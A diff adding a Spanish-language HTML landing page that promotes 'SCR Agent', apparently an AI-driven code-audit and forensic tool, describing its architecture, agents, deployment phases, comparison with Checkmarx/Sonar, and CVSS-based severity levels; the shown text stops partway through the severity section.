@@ -1,0 +1,2069 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SCR Agent - Auditoría de Código Inteligente</title>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/diagrams.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">
+                <span class="logo-icon">🔐</span>
+                <span class="logo-text">SCR Agent</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#hero" class="nav-link">Inicio</a></li>
+                <li><a href="#problema" class="nav-link">Problema</a></li>
+                <li><a href="#arquitectura" class="nav-link">Arquitectura</a></li>
+                <li><a href="#agentes" class="nav-link">Agentes IA</a></li>
+                <li><a href="#ejemplos" class="nav-link">Casos de Uso</a></li>
+                <li><a href="#dashboard" class="nav-link">Dashboard</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="hero" class="hero">
+        <div class="hero-content">
+            <h1 class="hero-title">SCR Agent</h1>
+            <h2 class="hero-subtitle">Auditoría Inteligente de Código con IA</h2>
+            <p class="hero-description">
+                Análisis automático de vulnerabilidades, investigación forense en tiempo real,
+                y remediación inteligente de hallazgos de seguridad
+            </p>
+            <div class="hero-stats">
+                <div class="stat">
+                    <div class="stat-number">14</div>
+                    <div class="stat-label">Incidentes Detectados</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">95%</div>
+                    <div class="stat-label">Precisión Análisis</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">3</div>
+                    <div class="stat-label">Módulos Integrados</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Problema & Solución -->
+    <section id="problema" class="problem-solution">
+        <div class="container">
+            <h2 class="section-title">El Desafío</h2>
+
+            <div class="problem-grid">
+                <div class="problem-card">
+                    <div class="problem-icon">❌</div>
+                    <h3>Vulnerabilidades No Detectadas</h3>
+                    <p>Análisis manual lento y propenso a errores humanos</p>
+                </div>
+                <div class="problem-card">
+                    <div class="problem-icon">⏱️</div>
+                    <h3>Falta de Trazabilidad</h3>
+                    <p>Sin seguimiento claro de cambios y remediciones</p>
+                </div>
+                <div class="problem-card">
+                    <div class="problem-icon">🔍</div>
+                    <h3>Análisis Superficial</h3>
+                    <p>Sin investigación forense de patrones de riesgo</p>
+                </div>
+            </div>
+
+            <h2 class="section-title" style="margin-top: 60px;">La Solución</h2>
+
+            <div class="solution-grid">
+                <div class="solution-card">
+                    <div class="solution-icon">✅</div>
+                    <h3>Análisis Automático</h3>
+                    <p>IA detecta vulnerabilidades en segundos con alta precisión</p>
+                </div>
+                <div class="solution-card">
+                    <div class="solution-icon">📊</div>
+                    <h3>Dashboard Integral</h3>
+                    <p>Seguimiento completo con estados y asignaciones</p>
+                </div>
+                <div class="solution-card">
+                    <div class="solution-icon">🔬</div>
+                    <h3>Investigación Forense</h3>
+                    <p>Timeline de cambios, patrones de riesgo y análisis arquitectónico</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Arquitectura Técnica -->
+    <section id="arquitectura" class="arquitectura">
+        <div class="container">
+            <h2 class="section-title">Arquitectura del Sistema</h2>
+            <p class="section-subtitle">Sistema escalable con 4 capas integradas - Hover para ver detalles</p>
+
+            <!-- 3D Architecture Diagram -->
+            <div class="arch-3d-container">
+                <div class="arch-3d-scene">
+                    <!-- Layer 1: Client -->
+                    <div class="arch-3d-layer layer-1" onclick="showLayerDetails('client')">
+                        <div class="layer-box 3d">
+                            <div class="layer-label">🖥️ Cliente</div>
+                            <div class="layer-tech">React • TypeScript • WebSockets</div>
+                        </div>
+                    </div>
+
+                    <!-- Layer 2: API -->
+                    <div class="arch-3d-layer layer-2" onclick="showLayerDetails('api')">
+                        <div class="layer-box 3d">
+                            <div class="layer-label">🌐 API Gateway</div>
+                            <div class="layer-tech">Node.js • Express • REST</div>
+                        </div>
+                    </div>
+
+                    <!-- Layer 3: Engine -->
+                    <div class="arch-3d-layer layer-3" onclick="showLayerDetails('engine')">
+                        <div class="layer-box 3d">
+                            <div class="layer-label">🧠 Engine IA</div>
+                            <div class="layer-tech">AST • Patterns • ML Models</div>
+                        </div>
+                    </div>
+
+                    <!-- Layer 4: Database -->
+                    <div class="arch-3d-layer layer-4" onclick="showLayerDetails('database')">
+                        <div class="layer-box 3d">
+                            <div class="layer-label">💾 Datos</div>
+                            <div class="layer-tech">PostgreSQL • Redis • Elasticsearch</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="arch-3d-info" id="arch-info">
+                    <h4>👆 Clickea en cualquier capa para ver detalles</h4>
+                    <p>La arquitectura está diseñada para procesar código en 4 etapas: recepción, validación, análisis profundo y almacenamiento con búsqueda ultrarrápida.</p>
+                </div>
+            </div>
+
+            <!-- Flujo de Análisis -->
+            <div class="arch-layers">
+                <div class="data-flow-section" style="margin-top: 60px;">
+                    <h3 class="layer-header">📊 Flujo de Análisis - De Código Fuente a Remediación</h3>
+                    <div class="flow-diagram">
+                        <div class="flow-stage">
+                            <div class="flow-icon">📝</div>
+                            <h4>Ingesta</h4>
+                            <p>Código fuente</p>
+                            <p class="flow-desc">Git, uploads, API</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">🔍</div>
+                            <h4>Parsing</h4>
+                            <p>AST Analysis</p>
+                            <p class="flow-desc">Estructura sintáctica</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">🎯</div>
+                            <h4>Detección</h4>
+                            <p>Pattern Match</p>
+                            <p class="flow-desc">200+ patrones</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">📊</div>
+                            <h4>Scoring</h4>
+                            <p>ML Risk Score</p>
+                            <p class="flow-desc">CVSS + Context</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">💾</div>
+                            <h4>Storage</h4>
+                            <p>Base de Datos</p>
+                            <p class="flow-desc">PostgreSQL</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">📈</div>
+                            <h4>Visualización</h4>
+                            <p>Dashboard</p>
+                            <p class="flow-desc">Real-time</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stack Tecnológico -->
+            <h3 style="margin-top: 60px; margin-bottom: 30px; text-align: center;">📚 Stack Tecnológico</h3>
+            <div class="tech-grid">
+                <div class="tech-card">
+                    <h4>🎨 Frontend</h4>
+                    <ul class="tech-list">
+                        <li><strong>React 18</strong> - UI interactiva</li>
+                        <li><strong>TypeScript</strong> - Tipado seguro</li>
+                        <li><strong>Vite</strong> - Build ultrarrápido</li>
+                        <li><strong>Tailwind CSS</strong> - Estilos</li>
+                    </ul>
+                </div>
+
+                <div class="tech-card">
+                    <h4>⚙️ Backend</h4>
+                    <ul class="tech-list">
+                        <li><strong>Node.js 18+</strong> - Runtime</li>
+                        <li><strong>Express.js</strong> - API Gateway</li>
+                        <li><strong>PostgreSQL 14+</strong> - BD Principal</li>
+                        <li><strong>Redis</strong> - Cache en memoria</li>
+                    </ul>
+                </div>
+
+                <div class="tech-card">
+                    <h4>🧠 Análisis & IA</h4>
+                    <ul class="tech-list">
+                        <li><strong>@babel/parser</strong> - JS/TS parsing</li>
+                        <li><strong>AST Analysis</strong> - Estructura sintáctica</li>
+                        <li><strong>ML Models</strong> - Risk scoring</li>
+                        <li><strong>OWASP DB</strong> - 200+ patrones</li>
+                    </ul>
+                </div>
+
+                <div class="tech-card">
+                    <h4>🔍 Búsqueda & Forense</h4>
+                    <ul class="tech-list">
+                        <li><strong>Elasticsearch</strong> - Full-text search</li>
+                        <li><strong>Git API</strong> - Análisis de commits</li>
+                        <li><strong>Timeline Engine</strong> - Correlación</li>
+                        <li><strong>Pattern Matching</strong> - Detección</li>
+                    </ul>
+                </div>
+            </div>
+                </div>
+            </div>
+
+
+    <!-- Agentes IA -->
+    <section id="agentes" class="agentes">
+        <div class="container">
+            <h2 class="section-title">Agentes IA Autónomos</h2>
+            <p class="section-subtitle">Análisis inteligente con modelos de machine learning especializados</p>
+
+            <div class="agentes-grid">
+                <div class="agente-card">
+                    <div class="agente-header threat">
+                        <span class="agente-icon">🤖</span>
+                        <h3>Agente de Detección</h3>
+                    </div>
+                    <div class="agente-body">
+                        <h4>Funcionalidades:</h4>
+                        <ul>
+                            <li>✅ Análisis de patrones conocidos</li>
+                            <li>✅ Detección de anomalías</li>
+                            <li>✅ Scoring automático de riesgo</li>
+                            <li>✅ Clasificación de vulnerabilidades</li>
+                        </ul>
+                        <h4 style="margin-top: 15px;">Explotación:</h4>
+                        <ul>
+                            <li>🎯 Ejecución automática por webhook</li>
+                            <li>🔄 Análisis continuo cada 24h</li>
+                            <li>📊 Reportes automáticos por email</li>
+                            <li>⚡ Alertas en tiempo real</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="agente-card">
+                    <div class="agente-header remediation">
+                        <span class="agente-icon">⚙️</span>
+                        <h3>Agente de Remediación</h3>
+                    </div>
+                    <div class="agente-body">
+                        <h4>Funcionalidades:</h4>
+                        <ul>
+                            <li>✅ Generación de soluciones</li>
+                            <li>✅ Análisis de impacto</li>
+                            <li>✅ Propuesta de parches</li>
+                            <li>✅ Validación de fixes</li>
+                        </ul>
+                        <h4 style="margin-top: 15px;">Explotación:</h4>
+                        <ul>
+                            <li>🔧 Sugerencias automáticas</li>
+                            <li>💡 Mejores prácticas integradas</li>
+                            <li>🧪 Testing de soluciones</li>
+                            <li>📋 Documentación generada</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="agente-card">
+                    <div class="agente-header forensic">
+                        <span class="agente-icon">🔬</span>
+                        <h3>Agente Forense</h3>
+                    </div>
+                    <div class="agente-body">
+                        <h4>Funcionalidades:</h4>
+                        <ul>
+                            <li>✅ Análisis de cambios históricos</li>
+                            <li>✅ Detección de patrones de riesgo</li>
+                            <li>✅ Correlación de eventos</li>
+                            <li>✅ Investigación de usuarios</li>
+                        </ul>
+                        <h4 style="margin-top: 15px;">Explotación:</h4>
+                        <ul>
+                            <li>🕐 Timeline automático de cambios</li>
+                            <li>👥 Análisis de comportamiento</li>
+                            <li>⚠️ Detección de anomalías</li>
+                            <li>📊 Reportes correlacionados</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="agente-card">
+                    <div class="agente-header incident">
+                        <span class="agente-icon">🎯</span>
+                        <h3>Agente de Respuesta</h3>
+                    </div>
+                    <div class="agente-body">
+                        <h4>Funcionalidades:</h4>
+                        <ul>
+                            <li>✅ Monitoreo en tiempo real</li>
+                            <li>✅ Escalamiento automático</li>
+                            <li>✅ Gestión de incidentes</li>
+                            <li>✅ Seguimiento de resolución</li>
+                        </ul>
+                        <h4 style="margin-top: 15px;">Explotación:</h4>
+                        <ul>
+                            <li>🚨 Alertas automáticas</li>
+                            <li>📍 Asignación inteligente</li>
+                            <li>⏱️ Recordatorios automáticos</li>
+                            <li>✓ Validación de cierre</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- Arquitectura Docker & Deployment -->
+    <section id="deployment" class="deployment">
+        <div class="container">
+            <h2 class="section-title">Arquitectura Docker & Deployment</h2>
+            <p class="section-subtitle">Solución containerizada y escalable</p>
+
+            <div class="deployment-grid">
+                <div class="deployment-card">
+                    <h3>🐳 Contenedores</h3>
+                    <div class="code-block">
+                        <div class="code-line"><span class="keyword">Frontend:</span> Node 18 + React</div>
+                        <div class="code-line"><span class="keyword">Backend:</span> Node 18 + Express</div>
+                        <div class="code-line"><span class="keyword">Database:</span> PostgreSQL 14</div>
+                        <div class="code-line"><span class="keyword">Cache:</span> Redis 7</div>
+                    </div>
+                </div>
+
+                <div class="deployment-card">
+                    <h3>⚙️ Orquestación</h3>
+                    <div class="code-block">
+                        <div class="code-line"><span class="keyword">Local:</span> Docker Compose</div>
+                        <div class="code-line"><span class="keyword">Production:</span> Docker Swarm / K8s</div>
+                        <div class="code-line"><span class="keyword">LB:</span> Nginx / HAProxy</div>
+                        <div class="code-line"><span class="keyword">Scaling:</span> Horizontal auto</div>
+                    </div>
+                </div>
+
+                <div class="deployment-card">
+                    <h3>📊 Monitoreo</h3>
+                    <div class="code-block">
+                        <div class="code-line"><span class="keyword">Metrics:</span> Prometheus</div>
+                        <div class="code-line"><span class="keyword">Dashboard:</span> Grafana</div>
+                        <div class="code-line"><span class="keyword">Logs:</span> ELK Stack</div>
+                        <div class="code-line"><span class="keyword">Alerts:</span> PagerDuty</div>
+                    </div>
+                </div>
+
+                <div class="deployment-card">
+                    <h3>🚀 CI/CD</h3>
+                    <div class="code-block">
+                        <div class="code-line"><span class="keyword">Pipeline:</span> GitHub Actions</div>
+                        <div class="code-line"><span class="keyword">Build:</span> Multi-stage Docker</div>
+                        <div class="code-line"><span class="keyword">Registry:</span> Docker Hub</div>
+                        <div class="code-line"><span class="keyword">Deploy:</span> Automated</div>
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="margin-top: 50px; margin-bottom: 30px; text-align: center;">Fases de Implementación</h3>
+
+            <div class="phases-grid">
+                <div class="phase-card phase-1">
+                    <div class="phase-header">
+                        <h4>Fase 1: Etapa Piloto</h4>
+                        <span class="phase-badge">Análisis Bajo Demanda</span>
+                    </div>
+                    <div class="phase-body">
+                        <p><strong>Ejecución:</strong> Docker local por analista</p>
+                        <ul>
+                            <li>✓ Deploy en máquina local del analista</li>
+                            <li>✓ Análisis bajo demanda por repositorio</li>
+                            <li>✓ Generación manual de reportes</li>
+                            <li>✓ Sin automatización CI/CD</li>
+                            <li>✓ Control total del analista</li>
+                            <li>✓ Pruebas de viabilidad</li>
+                        </ul>
+                        <p style="margin-top: 15px; font-size: 0.9rem; color: var(--text-muted);">
+                            <strong>Duración:</strong> 1-3 meses<br>
+                            <strong>Objetivo:</strong> Validar metodología y resultados
+                        </p>
+                    </div>
+                </div>
+
+                <div class="phase-card phase-2">
+                    <div class="phase-header">
+                        <h4>Fase 2: Producción</h4>
+                        <span class="phase-badge">Análisis Automatizado</span>
+                    </div>
+                    <div class="phase-body">
+                        <p><strong>Ejecución:</strong> Servidor en producción con pipeline CI/CD</p>
+                        <ul>
+                            <li>✓ Deploy en infraestructura dedicada</li>
+                            <li>✓ Análisis automático en cada push</li>
+                            <li>✓ Integración con GitHub Actions/GitLab CI</li>
+                            <li>✓ Reportes automáticos por email</li>
+                            <li>✓ Alertas en tiempo real</li>
+                            <li>✓ Dashboard centralizado 24/7</li>
+                            <li>✓ Escalabilidad horizontal</li>
+                        </ul>
+                        <p style="margin-top: 15px; font-size: 0.9rem; color: var(--text-muted);">
+                            <strong>Duración:</strong> Implementación gradual<br>
+                            <strong>Objetivo:</strong> Automatización completa del pipeline
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="deployment-diagram" style="margin-top: 50px;">
+                <h3>Transición de Fases</h3>
+                <svg viewBox="0 0 1000 200" class="deployment-svg" style="margin-top: 20px;">
+                    <!-- Fase 1 -->
+                    <rect x="50" y="40" width="350" height="120" class="phase-box phase1-box" rx="8"/>
+                    <text x="225" y="65" class="phase-title">FASE 1: Piloto</text>
+                    <text x="75" y="90" class="phase-text">• Docker Local</text>
+                    <text x="75" y="110" class="phase-text">• Análisis Manual</text>
+                    <text x="75" y="130" class="phase-text">• Validación</text>
+                    <text x="75" y="150" class="phase-text">• 1-3 meses</text>
+
+                    <!-- Arrow -->
+                    <path d="M 420 100 L 520 100" class="phase-arrow"/>
+                    <text x="450" y="90" class="phase-label">Validación Exitosa</text>
+
+                    <!-- Fase 2 -->
+                    <rect x="550" y="40" width="350" height="120" class="phase-box phase2-box" rx="8"/>
+                    <text x="725" y="65" class="phase-title">FASE 2: Producción</text>
+                    <text x="575" y="90" class="phase-text">• Servidor Dedicado</text>
+                    <text x="575" y="110" class="phase-text">• CI/CD Automatizado</text>
+                    <text x="575" y="130" class="phase-text">• Escalable</text>
+                    <text x="575" y="150" class="phase-text">• 24/7 Activo</text>
+                </svg>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- Ventajas de SCR -->
+    <section id="ventajas" class="ventajas">
+        <div class="container">
+            <h2 class="section-title">Ventajas de SCR Agent</h2>
+            <p class="section-subtitle">Beneficios clave vs análisis manual y herramientas tradicionales</p>
+
+            <div class="ventajas-grid">
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">⚡</div>
+                    <h3>Análisis Automático 24/7</h3>
+                    <p>Escanea tu código continuamente sin intervención manual, detectando vulnerabilidades en tiempo real.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">🎯</div>
+                    <h3>Precisión Superior</h3>
+                    <p>95% de precisión con ML avanzado. Reduce falsos positivos comparado con SAST tradicional.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">🔍</div>
+                    <h3>Análisis Profundo</h3>
+                    <p>Va más allá del análisis estático: incluye forense, patrones de riesgo y análisis arquitectónico.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">📊</div>
+                    <h3>Inteligencia Contextual</h3>
+                    <p>Entiende el contexto del código, no solo patrones. Identifica vulnerabilidades lógicas y de arquitectura.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">💡</div>
+                    <h3>Remediación Automática</h3>
+                    <p>Propone soluciones de código listos para usar, no solo reporta problemas.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">🔒</div>
+                    <h3>Trazabilidad Completa</h3>
+                    <p>Registra quién, qué, cuándo y cómo de cada hallazgo. Cumple con auditorías de seguridad.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">⏱️</div>
+                    <h3>Ahorro de Tiempo</h3>
+                    <p>Análisis que tomaría días ahora se completa en minutos. Reduce carga de trabajo manual.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">🚀</div>
+                    <h3>Escalabilidad</h3>
+                    <p>Analiza múltiples repositorios simultáneamente sin degradación de performance.</p>
+                </div>
+                <div class="ventaja-card">
+                    <div class="ventaja-icon">🧠</div>
+                    <h3>Aprendizaje Continuo</h3>
+                    <p>Mejora con cada análisis. Los patrones detectados entrenan el modelo para futuras detecciones.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SCR Agent + Checkmarx/Sonar -->
+    <section id="scr-vs-sast" class="scr-vs-sast">
+        <div class="container">
+            <h2 class="section-title">SCR Agent + Checkmarx/Sonar = Auditoría Completa</h2>
+            <p class="section-subtitle">Complemento estratégico: detecta vulnerabilidades + descubre funciones maliciosas y lógica no autorizada</p>
+
+            <!-- Estatus actual -->
+            <div style="margin-bottom: 50px; background: #1E1E20; border: 2px solid #EAB308; border-radius: 12px; padding: 30px;">
+                <h3 style="color: #EAB308; margin-bottom: 25px;">⚠️ Situación Actual: Gaps de Auditoría</h3>
+                <p style="color: #94A3B8; margin-bottom: 20px;">Actualmente, incluso CON Checkmarx y Sonar, no detectamos:</p>
+
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px;">
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">🎭 Funciones Maliciosas</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Código oculto que hace algo diferente a su propósito aparente. Ej: función que "registra datos" pero también exfiltra datos sensibles</p>
+                    </div>
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">🚪 Backdoors y Trampas</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Puertas traseras intencionales en el código. Ej: credenciales hardcodeadas, métodos administrativos ocultos</p>
+                    </div>
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">❌ Lógica No Requerida</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Funcionalidad que NO está en los requerimientos de negocio. Ej: endpoints no documentados, operaciones no autorizadas</p>
+                    </div>
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">📊 Bypass de Validaciones</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Código que evita controles o validaciones deliberadamente. Ej: saltarse autenticación en ciertas rutas</p>
+                    </div>
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">⏰ Lógica Temporal (Bombas)</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Código que actúa solo en fechas/horas específicas. Ej: transferencias automáticas cada primer día del mes</p>
+                    </div>
+                    <div style="background: #EAB308/10; border-left: 4px solid #EAB308; padding: 20px; border-radius: 8px;">
+                        <h5 style="color: #EAB308; margin-bottom: 10px;">👥 Comportamientos Sospechosos</h5>
+                        <p style="font-size: 13px; color: #94A3B8;">Patrones de código que no encajan con la arquitectura. Ej: función que accede a datos que no debería</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lo que aporta SCR Agent -->
+            <div style="background: #F97316/5; border: 2px solid #F97316; border-radius: 12px; padding: 30px; margin-bottom: 40px;">
+                <h3 style="color: #F97316; margin-bottom: 25px; text-align: center;">🔬 Lo que SCR Agent descubre (que Checkmarx/Sonar no pueden)</h3>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 25px;">
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Detección de Funciones Maliciosas</h4>
+                        <p>IA analiza comportamiento de funciones: ¿hace lo que dice que hace? ¿accede a datos no autorizados?</p>
+                    </div>
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Validación de Requerimientos</h4>
+                        <p>Compara el código contra especificaciones de negocio: ¿Se implementó exactamente lo que se pidió?</p>
+                    </div>
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Análisis de Intención</h4>
+                        <p>Reconoce patrones de backdoors, trampas, lógica oculta. Ej: detecta credenciales hardcodeadas incluso si están "bien ocultadas"</p>
+                    </div>
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Auditoría de Arquitectura</h4>
+                        <p>Valida que el código respete la arquitectura definida. Detecta desviaciones intencionales o negligentes</p>
+                    </div>
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Investigación Forense</h4>
+                        <p>Quién introdujo esta función? ¿En qué commit? ¿Fue aprobado en code review? ¿Tiene historia?</p>
+                    </div>
+                    <div>
+                        <h4 style="color: #22C55E; margin-bottom: 15px;">✅ Contexto y Correlación</h4>
+                        <p>Relaciona funciones sospechosas con cambios recientes, usuarios, patterns. ¿Es coincidencia o patrón deliberado?</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- El flujo de trabajo integrado -->
+            <div style="background: #1E1E20; border: 1px solid #2D2D2D; border-radius: 12px; padding: 30px;">
+                <h3 style="text-align: center; margin-bottom: 30px;">📊 Flujo de trabajo integrado recomendado</h3>
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; text-align: center;">
+                    <div style="padding: 20px; background: #2D2D2D; border-radius: 8px;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">1️⃣</div>
+                        <h4>Checkmarx/Sonar</h4>
+                        <p style="font-size: 12px; color: #6B7280;">Análisis en CI/CD</p>
+                    </div>
+                    <div style="padding: 20px; background: #2D2D2D; border-radius: 8px;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">→</div>
+                        <h4>SCR Agent</h4>
+                        <p style="font-size: 12px; color: #6B7280;">Validación + Forense</p>
+                    </div>
+                    <div style="padding: 20px; background: #2D2D2D; border-radius: 8px;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">→</div>
+                        <h4>Remediación</h4>
+                        <p style="font-size: 12px; color: #6B7280;">Código solución automático</p>
+                    </div>
+                    <div style="padding: 20px; background: #2D2D2D; border-radius: 8px;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">→</div>
+                        <h4>Dashboard</h4>
+                        <p style="font-size: 12px; color: #6B7280;">Seguimiento + Cierre</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ROI -->
+            <div style="margin-top: 40px; padding-top: 40px; border-top: 1px solid #2D2D2D;">
+                <h3 style="text-align: center; margin-bottom: 25px;">💰 Impacto económico</h3>
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
+                    <div style="padding: 20px; background: #22C55E/10; border: 2px solid #22C55E; border-radius: 8px; text-align: center;">
+                        <div style="font-size: 28px; color: #22C55E; font-weight: bold;">60%</div>
+                        <p style="font-size: 14px; color: #6B7280;">Menos tiempo en triaging</p>
+                    </div>
+                    <div style="padding: 20px; background: #22C55E/10; border: 2px solid #22C55E; border-radius: 8px; text-align: center;">
+                        <div style="font-size: 28px; color: #22C55E; font-weight: bold;">95%</div>
+                        <p style="font-size: 14px; color: #6B7280;">Precisión (vs 60% de SAST)</p>
+                    </div>
+                    <div style="padding: 20px; background: #22C55E/10; border: 2px solid #22C55E; border-radius: 8px; text-align: center;">
+                        <div style="font-size: 28px; color: #22C55E; font-weight: bold;">2-3 semanas</div>
+                        <p style="font-size: 14px; color: #6B7280;">Payback period (inversión baja)</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Caso Real -->
+    <section id="caso-real" class="caso-real" style="background: linear-gradient(135deg, #EF4444/5 0%, #F97316/5 100%); padding: 60px 0;">
+        <div class="container">
+            <h2 class="section-title">Caso Real: El Problema que Solo SCR Agent Resuelve</h2>
+            <p class="section-subtitle" style="max-width: 800px; margin: 0 auto;">Escenario típico: Checkmarx detecta una vulnerabilidad, pero... ¿realmente es un problema?</p>
+
+            <div style="margin-top: 40px; display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: center;">
+                <!-- El Problema -->
+                <div style="border-left: 4px solid #EF4444; padding-left: 20px;">
+                    <h3 style="color: #EF4444; margin-bottom: 20px;">❌ Escenario CON SOLO Checkmarx/Sonar</h3>
+                    <ol style="color: #94A3B8; line-height: 1.8; font-size: 14px;">
+                        <li><strong style="color: white;">Checkmarx detecta</strong> una inyección SQL en línea 247 del archivo AuthManager.java</li>
+                        <li><strong style="color: white;">PERO:</strong> Genera 12 falsos positivos más en el mismo reporte</li>
+                        <li><strong style="color: white;">Tu equipo gasta 3 horas</strong> triaging hallazgos para encontrar los reales</li>
+                        <li><strong style="color: white;">No sabes quién la introdujo</strong> o por qué (¿intencional, descuido, PR?)</li>
+                        <li><strong style="color: white;">Nadie sabe cuál es la solución</strong> → el dev crea un parche lento</li>
+                        <li><strong style="color: white;">No hay seguimiento automático</strong> → se cae entre prioridades</li>
+                        <li><strong style="color: white;">Resultado:</strong> La vuln puede estar meses sin resolver ⏱️</li>
+                    </ol>
+                </div>
+
+                <!-- La Solución -->
+                <div style="border-left: 4px solid #22C55E; padding-left: 20px;">
+                    <h3 style="color: #22C55E; margin-bottom: 20px;">✅ CON SCR Agent (complemento)</h3>
+                    <ol style="color: #94A3B8; line-height: 1.8; font-size: 14px;">
+                        <li><strong style="color: white;">Checkmarx detecta</strong> lo mismo (tiene la base)</li>
+                        <li><strong style="color: #22C55E;">SCR Agent valida</strong> y filtra → solo 1 real positivo (95%)</li>
+                        <li><strong style="color: #22C55E;">IA analiza</strong> el código en contexto → 2 minutos (vs 3 horas)</li>
+                        <li><strong style="color: #22C55E;">Forense muestra</strong> que Juan lo introdujo en el PR #427 hace 2 semanas</li>
+                        <li><strong style="color: #22C55E;">Código solución automático</strong> generado y listo para review</li>
+                        <li><strong style="color: #22C55E;">Dashboard auto-asigna</strong> a Juan con recordatorio automático</li>
+                        <li><strong style="color: #22C55E;">Resuelto en 1 día</strong> con trazabilidad completa 📊</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Determinación de Criticidad -->
+    <section id="criticidad" class="criticidad">
+        <div class="container">
+            <h2 class="section-title">¿Cómo se Determina la Criticidad?</h2>
+            <p class="section-subtitle">Sistema de clasificación basado en CVSS y análisis contextual</p>
+
+            <div class="criticidad-content">
+                <div class="criticidad-section">
+                    <h3>📊 CVSS Score (Common Vulnerability Scoring System)</h3>
+                    <p>Es la métrica base que evalúa la vulnerabilidad de forma técnica:</p>
+
+                    <div class="cvss-scales">
+                        <div class="cvss-scale">
+                            <div class="cvss-label">9.0 - 10.0</div>
+                            <div class="cvss-band critical">🔴 CRÍTICO</div>
+                            <div class="cvss-desc">Explotable remotamente, sin autenticación, impacto máximo</div>
+                        </div>
+                        <div class="cvss-scale">
+                            <div class="cvss-label">7.0 - 8.9</div>
+                            <div class="cvss-band high">🟠 ALTO</div>
+                            <div class="cvss-desc">Impacto significativo, fácil de explotar, requiere poco conocimiento</div>
+                        </div>
+                        <div class="cvss-scale">
+                            <div class="cvss-label">4.0 - 6.9</div>
+                            <div class="cvss-band medium">🟡 MEDIO</div>
+                            <div class="cvss-desc">Impacto moderado, requiere ciertos requisitos previos</div>
